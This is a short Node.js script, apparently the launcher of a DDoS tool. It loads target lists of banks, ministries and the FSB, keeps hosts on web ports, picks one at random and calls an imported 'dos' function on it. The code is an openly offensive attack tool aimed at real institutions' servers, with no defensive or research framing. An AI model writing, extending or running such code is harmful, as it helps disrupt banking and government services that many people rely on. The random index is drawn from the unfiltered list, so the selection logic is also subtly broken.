const { dos } = require("./controllers/ddos.js");

const banks = require("./targets/banks.json");
const ministries = require("./targets/ministries.json");
const fsb = require("./targets/fsb.json");

const jointTargets = [...banks, ...ministries, ...fsb];

const index = Math.floor(Math.random() * (jointTargets.length - 1));

const allowedPorts = [80, 8080, 443];
const filteredTargets = jointTargets.filter(({ port }) =>
  allowedPorts.includes(port)
);

const { ip_str, port } = filteredTargets[index];

const protocol = port === 443 ? "https://" : "http://";

dos(`${protocol}${ip_str}`, 150, 0);
